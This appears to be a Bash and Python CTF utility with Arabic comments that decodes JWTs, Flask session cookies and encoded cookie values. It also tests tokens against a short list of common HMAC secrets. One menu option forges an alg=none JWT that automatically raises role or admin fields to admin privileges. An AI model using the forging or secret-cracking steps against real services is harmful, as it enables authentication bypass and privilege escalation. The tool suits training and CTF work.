#!/bin/bash
# =============================================================
#  RAQIB CTF — Cookie & JWT Decoder
#  أداة #15: فك وتحليل JWT + Flask sessions + Cookies
#  اللغة: Bash wrapper + Python heredoc
#         Python لأن base64url + JSON parsing + HMAC checking
# =============================================================

echo -e "${CYAN}╔══════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║  🍪 Cookie / JWT Decoder                          ║${NC}"
echo -e "${CYAN}║  حلّل JWT tokens و Flask sessions و Cookies     ║${NC}"
echo -e "${CYAN}╚══════════════════════════════════════════════════╝${NC}"
echo ""

echo -e "  ${YELLOW}1)${NC} JWT Token Decoder + signature check"
echo -e "  ${YELLOW}2)${NC} Flask Session Cookie Decoder"
echo -e "  ${YELLOW}3)${NC} Base64 Cookie Decoder (Generic)"
echo -e "  ${YELLOW}4)${NC} JWT None Algorithm Attack"
echo ""
read -rp "  اختر: " cookie_mode

case $cookie_mode in
    1)
        read -rp "  أدخل JWT token: " jwt_token
        [ -z "$jwt_token" ] && { echo -e "${RED}لا يوجد مدخل${NC}"; exit 1; }

        python3 - "$jwt_token" <<'PYEOF'
import sys, base64, json, hmac, hashlib, re

token = sys.argv[1].strip()
parts = token.split('.')

if len(parts) != 3:
    print(f"\n  ❌ ليس JWT صحيحاً (يجب أن يكون 3 أجزاء مفصولة بـ .)")
    sys.exit(1)

def b64_decode(s):
    """Base64url decode بدون padding حساس"""
    s = s.replace('-', '+').replace('_', '/')
    padding = 4 - len(s) % 4
    if padding != 4:
        s += '=' * padding
    return base64.b64decode(s)

SEP = "═" * 55
print(f"\n{SEP}")
print("  📋 JWT Analysis")
print(SEP)

# Header
try:
    header_raw = b64_decode(parts[0])
    header = json.loads(header_raw)
    print("\n  [HEADER]")
    for k, v in header.items():
        print(f"    {k}: {v}")
    alg = header.get('alg', 'unknown')
    typ = header.get('typ', 'JWT')
except Exception as e:
    print(f"  ❌ Header decode failed: {e}")
    alg = 'unknown'

# Payload
try:
    payload_raw = b64_decode(parts[1])
    payload = json.loads(payload_raw)
    print("\n  [PAYLOAD]")
    for k, v in payload.items():
        if k in ('iat', 'exp', 'nbf'):
            import datetime
            try:
                dt = datetime.datetime.utcfromtimestamp(v)
                print(f"    {k}: {v}  ({dt.strftime('%Y-%m-%d %H:%M:%S')} UTC)")
                if k == 'exp' and dt < datetime.datetime.utcnow():
                    print(f"    ⚠️  TOKEN EXPIRED!")
            except Exception:
                print(f"    {k}: {v}")
        else:
            print(f"    {k}: {v}")
except Exception as e:
    print(f"  ❌ Payload decode failed: {e}")

# Signature info
print(f"\n  [SIGNATURE]")
print(f"    Algorithm: {alg}")
print(f"    Signature (base64): {parts[2][:40]}...")

# Security checks
print(f"\n  [SECURITY CHECKS]")
if alg.lower() == 'none':
    print("  🚨 CRITICAL: alg=none — التوقيع مُعطَّل! قابل للتلاعب.")
elif alg.lower().startswith('hs'):
    print(f"  ⚠️  HMAC ({alg}) — يمكن brute force المفتاح لو كان ضعيفاً")
    print("  💡 جرب: jwt_tool أو hashcat mode 16500")
elif alg.lower().startswith('rs') or alg.lower().startswith('es'):
    print(f"  ℹ️  Asymmetric ({alg}) — يحتاج public key للتحقق")

# Common weak secrets test
print(f"\n  [WEAK SECRET TEST]")
weak_secrets = ['secret', 'password', 'key', '123456', 'jwt_secret',
                'your-256-bit-secret', 'supersecret', 'admin', 'test']
header_payload = f"{parts[0]}.{parts[1]}"
sig_bytes = b64_decode(parts[2])
cracked = False
for secret in weak_secrets:
    try:
        expected = hmac.new(secret.encode(), header_payload.encode(), hashlib.sha256).digest()
        if expected == sig_bytes:
            print(f"  🚨 CRACKED! Secret = '{secret}'")
            cracked = True
            break
    except Exception:
        pass
if not cracked:
    print(f"  ✅ لم يُكسر بالأسرار الشائعة ({len(weak_secrets)} محاولة)")

print()
PYEOF
        ;;

    2)
        read -rp "  أدخل Flask session cookie: " flask_cookie
        [ -z "$flask_cookie" ] && { echo -e "${RED}لا يوجد مدخل${NC}"; exit 1; }

        python3 - "$flask_cookie" <<'PYEOF'
import sys, base64, json, zlib

cookie = sys.argv[1].strip()

# Flask sessions: eyJ... أو .eyJ... (مع توقيع)
if '.' in cookie:
    parts = cookie.split('.')
    encoded = parts[0]
else:
    encoded = cookie

# تنظيف
encoded = encoded.lstrip('.')
if encoded.startswith('eyJ'):
    # base64url
    encoded = encoded.replace('-', '+').replace('_', '/')
    padding = 4 - len(encoded) % 4
    if padding != 4:
        encoded += '=' * padding
    try:
        raw = base64.b64decode(encoded)
        data = json.loads(raw)
        print("\n  ✅ Flask Session Decoded:")
        print(json.dumps(data, indent=4, ensure_ascii=False))
    except Exception as e:
        print(f"  ❌ فشل فك التشفير: {e}")
elif cookie.startswith('.eJy') or cookie.startswith('eJy'):
    # zlib compressed Flask session
    b64 = cookie.lstrip('.')
    b64 = b64.replace('-', '+').replace('_', '/')
    b64 += '=' * (4 - len(b64) % 4)
    try:
        raw = base64.b64decode(b64)
        decompressed = zlib.decompress(raw)
        data = json.loads(decompressed)
        print("\n  ✅ Flask Session (zlib) Decoded:")
        print(json.dumps(data, indent=4, ensure_ascii=False))
    except Exception as e:
        print(f"  ❌ فشل fk التشفير (zlib): {e}")
else:
    print("  ⚠️  لا يبدو Flask session cookie معروف")

print()
PYEOF
        ;;

    3)
        read -rp "  أدخل Cookie value: " generic_cookie
        [ -z "$generic_cookie" ] && { echo -e "${RED}لا يوجد مدخل${NC}"; exit 1; }

        python3 - "$generic_cookie" <<'PYEOF'
import sys, base64, json, urllib.parse

cookie = sys.argv[1].strip()
print(f"\n  الأصلي: {cookie}")
print("  ─────────────────────────────────────")

# URL decode
url_dec = urllib.parse.unquote(cookie)
if url_dec != cookie:
    print(f"\n  [URL Decoded]: {url_dec}")
    cookie = url_dec

# Base64 standard
try:
    padded = cookie + '=' * (-len(cookie) % 4)
    decoded = base64.b64decode(padded, validate=True)
    text = decoded.decode('utf-8', errors='replace')
    print(f"\n  [Base64 Decoded]: {text}")
    try:
        obj = json.loads(text)
        print("  [JSON Parsed]:")
        print(json.dumps(obj, indent=4, ensure_ascii=False))
    except Exception:
        pass
except Exception:
    pass

# Base64 URL-safe
try:
    url_safe = cookie.replace('-', '+').replace('_', '/')
    padded = url_safe + '=' * (-len(url_safe) % 4)
    decoded = base64.b64decode(padded)
    text = decoded.decode('utf-8', errors='replace')
    print(f"\n  [Base64url Decoded]: {text}")
except Exception:
    pass

# Hex
import re
if re.match(r'^[0-9a-fA-F]+$', cookie) and len(cookie) % 2 == 0:
    try:
        decoded = bytes.fromhex(cookie).decode('utf-8', errors='replace')
        print(f"\n  [Hex Decoded]: {decoded}")
    except Exception:
        pass
print()
PYEOF
        ;;

    4)
        echo ""
        echo -e "  ${RED}⚠️  JWT None Algorithm Attack${NC}"
        echo -e "  ${GREY}يصنع token بـ alg=none (بدون توقيع)${NC}"
        echo ""
        read -rp "  أدخل JWT الأصلي لتعديل payload: " orig_jwt
        [ -z "$orig_jwt" ] && { echo -e "${RED}لا يوجد مدخل${NC}"; exit 1; }

        python3 - "$orig_jwt" <<'PYEOF'
import sys, base64, json

orig = sys.argv[1].strip()
parts = orig.split('.')
if len(parts) != 3:
    print("  ❌ JWT غير صحيح"); sys.exit(1)

def b64d(s):
    s = s.replace('-', '+').replace('_', '/')
    return base64.b64decode(s + '=' * (4 - len(s) % 4))

def b64e(b):
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

try:
    payload = json.loads(b64d(parts[1]))
    print("\n  Payload الأصلي:")
    print(json.dumps(payload, indent=2, ensure_ascii=False))
except Exception as e:
    print(f"  ❌ {e}"); sys.exit(1)

# تعديل تلقائي: رفع الصلاحيات إذا وُجدت
for key in ('role', 'admin', 'is_admin', 'user_type', 'level', 'privilege'):
    if key in payload:
        old = payload[key]
        payload[key] = True if isinstance(old, bool) else 'admin'
        print(f"\n  🔧 تعديل: {key}: {old} → {payload[key]}")

new_header = b64e(json.dumps({"alg": "none", "typ": "JWT"}).encode())
new_payload = b64e(json.dumps(payload).encode())

print(f"\n  ✅ JWT الجديد (alg=none):")
print(f"  {new_header}.{new_payload}.")
print(f"\n  ⚠️  يشتغل فقط إذا السيرفر لا يتحقق من alg (ثغرة قديمة)")
print()
PYEOF
        ;;

    *)
        echo -e "${RED}اختيار غير صحيح${NC}" ;;
esac

pause
